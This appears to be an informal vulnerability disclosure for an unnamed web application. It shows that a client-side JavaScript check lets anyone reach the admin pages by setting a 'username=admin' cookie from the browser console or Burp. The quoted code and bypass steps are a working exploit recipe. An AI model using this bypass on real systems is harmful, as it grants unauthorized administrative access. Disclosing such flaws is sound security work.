Details
The mentioned system is affected by auth bypass flaw that allow an attacker to get admin access on the vulnerable machine without perior access
The security check is really stupid , depend on js
affected lines

js/util.js
function alertWithoutLogin(){
    var username = getCookie("username");
    //alert(username);
    if(!!!username){
        alert('Sorry, permission denied. Please login first!');
    }
}

so actually it just check if username value exist in cookies
and if not , redirect to login.html
just like that!!!!!!!!!!!!!

exploitation?!
just from browser , press f12 , open console
type document.cookie="username=admin"
or from burp intercept proxy and set the cookies as well
go to ip/admin/index.html
and you are in , simple like that :/
